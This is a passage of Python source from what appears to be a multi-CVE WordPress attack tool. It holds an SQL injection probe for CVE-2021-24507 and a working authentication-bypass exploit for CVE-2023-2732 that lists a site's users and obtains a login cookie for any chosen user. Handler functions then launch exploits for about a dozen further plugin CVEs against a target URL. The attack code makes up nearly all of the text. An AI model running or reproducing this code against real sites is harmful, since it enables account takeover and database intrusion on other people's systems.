    response = sessionn.post(profile_url, headers=headers, data=data, verify=False)
    return response.text

def assess_sqli_vulnerability_24507(profile_url, nonce):
    response = submit_request_24507(profile_url, nonce, "'")
    if 'database error' in response:
        return True, 'Vulnerable to Error-Based SQL Injection.'
    
    response1 = submit_request_24507(profile_url, nonce, '9656)) and ((7556=1223')
    response2 = submit_request_24507(profile_url, nonce, '9634)) or ((6532=6532')
    if response1 == '' and (len(response2) > len(response1)):
        return True, 'Vulnerable to Boolean-Based SQL Injection.'
    
    return False, 'Not Vulnerable.'

def scan_cve_2021_24507(target):
    nonce, resolved_url = retrieve_nonce_24507(target)
    vulnerability_status = assess_sqli_vulnerability_24507(resolved_url, nonce)
    print(vulnerability_status[1])


# CVE-2021-24507 EXPLOIT ENDS


# CVE-2023-2732 EXPLOIT STARTS

import click

sessionnn = requests.Session()

def version_check_2732(profile_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    plugin_url = f"{profile_url}/wp-content/plugins/mstore-api/readme.txt"
    
    print("[•] Checking plugin version from readme.txt...")
    
    try:
        response = requests.get(plugin_url, headers=headers, verify=False, timeout=30)
        
        if response.status_code == 200:
            content = response.text
            version_line = next((line for line in content.split('\n') if line.startswith('Stable tag:')), None)
            
            if version_line:
                version = version_line.split(':')[1].strip()
                print(f"[•] Plugin version found: {version}")
                
                if version >= '3.9.3':
                    print("[•] The plugin version is 3.9.3 or above, which is not vulnerable.")
                    return False
                else:
                    print("[•] The plugin version is below 3.9.3 and might be vulnerable.")
                    return True
            else:
                print("[•] Could not retrieve version information from readme.txt.")
                return False
        else:
            print("[•] Failed to fetch readme.txt file, checking via wp-json API...")
            response = sessionnn.get(f"{profile_url}/wp-json/", headers=headers, verify=False, timeout=30)
            if "add-listing" in response.text and "get-nearby-listings" in response.text:
                print("[•] The plugin might be installed, but we couldn't verify the version. Proceeding with exploit...")
                return True
            else:
                print("[•] The plugin is not installed on this WordPress site.")
                return False
    except Exception as e:
        print(f"[•] Error checking plugin version: {e}")
        return False

def fetch_users_from_rest_api_2732(profile_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Edge/16.16299'}
    print("[•] Fetching usernames via the REST API...")
    
    try:
        response = sessionnn.get(f"{profile_url}/wp-json/wp/v2/users", headers=headers, verify=False, timeout=30)
        
        if response.status_code == 200:
            users = response.json()
            print("[•] Successfully retrieved user information.")
            return users
        else:
            print(f"[•] Failed to fetch usernames. Response: {response.text}")
            return []
    except Exception as e:
        print(f"[•] Error fetching usernames: {e}")
        return []

def prompt_user_selection_2732(users):
    print("[•] Please select a user from the list below:")
    
    for user in users:
        print(f"  {user['id']}. {user['name']}")

    user_id = click.prompt("[•] Enter the user ID to select", type=int)
    selected_user = next((user for user in users if user['id'] == user_id), None)
    
    if selected_user:
        print(f"[•] User '{selected_user['name']}' selected.")
        return selected_user
    else:
        print("[•] Invalid user ID selected.")
        return None

def attempt_login_as_user_2732(profile_url, user_id, username):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    exploit_url = f"{profile_url}/wp-json/wp/v2/add-listing?id={user_id}"

    print(f"[•] Attempting to authenticate as user '{username}' using the exploit...")
    
    try:
        response = sessionnn.get(exploit_url, headers=headers, verify=False, timeout=30)
        cookies = requests.utils.dict_from_cookiejar(response.cookies)
        
        if any(cookie.startswith('wordpress_logged_in_') for cookie in cookies):
            print("\n[•] Vulnerable system found!")
            print("[•] Exploit Steps:")
            print(f"    1. Visit the following URL to trigger the exploit: {exploit_url}")
            print(f"    2. Visit {profile_url} to be logged in as '{username}'.")
        elif response.status_code == 403 and "cf-cookie-error" in response.text:
            print("[•] Cloudflare is blocking the exploit attempt.")
        else:
            print(f"[•] Exploit attempt unsuccessful. Status Code: {response.status_code}")
            for header, value in response.headers.items():
                print(f"    {header}: {value}")
    except Exception as e:
        print(f"[•] Error during exploit attempt: {e}")

def scan_cve_2023_2732(profile_url):
    if not version_check_2732(profile_url):
        print("[•] Target is not vulnerable or version check failed.")
        return

    users = fetch_users_from_rest_api_2732(profile_url)
    if not users:
        print("[•] No users found or failed to retrieve user list.")
        return

    selected_user = prompt_user_selection_2732(users)
    if not selected_user:
        print("[•] No valid user selected.")
        return

    attempt_login_as_user_2732(profile_url, selected_user['id'], selected_user['name'])


# CVE-2023-2732 EXPLOIT ENDS

def handle_wordpress_exploit(profile_url):
    try:
        print("\n")
        print(Fore.YELLOW + f"[•] Starting Scan for CVE-2023-28121 on {profile_url}..." + Style.RESET_ALL)
        
        main_28121(profile_url)
        
        print(Fore.GREEN + "[•] CVE-2023-28121 exploit completed successfully." + Style.RESET_ALL)

    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return
    except Exception as e:
        print(Fore.RED + f"[•] An error occurred while handling CVE-2023-28121: {e}" + Style.RESET_ALL)


def handle_cve_2023_2732(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2023-2732 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2023_2732(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2023-2732 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2022_1386(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2022-1386 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        run_exploit_1386(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2022-1386 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2022_0739(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2022-0739 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2022_0739(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2022-0739 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2022_0441(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2022-0441 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2022_0441(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2022-0441 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2022_0316(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2022-0316 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2022_0316(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2022-0316 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2021_34656(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2021_34656 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2021_34656(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2021_34656 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2021_25003(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2021_25003 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2021_25003(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2021_25003 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2021_24884(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2021_24884 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2021_24884(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2021_24884 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2021_24507(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2021_24507 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2021_24507(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2021_24507 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return


def handle_cve_2021_24499(profile_url):
    try:
        print("\n")
        print(f"{Fore.CYAN}[•] Starting scan for {Fore.YELLOW}CVE-2021_24499 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}...")

        scan_cve_2021_24499(profile_url)

        print(f"{Fore.CYAN}[•] Completed scan for {Fore.YELLOW}CVE-2021_24499 {Fore.CYAN}on {Fore.GREEN}{profile_url}{Style.RESET_ALL}.")
    except KeyboardInterrupt:
        print(Fore.RED + "[!] Scan interrupted by user. Moving to the next CVE..." + Style.RESET_ALL)
        return
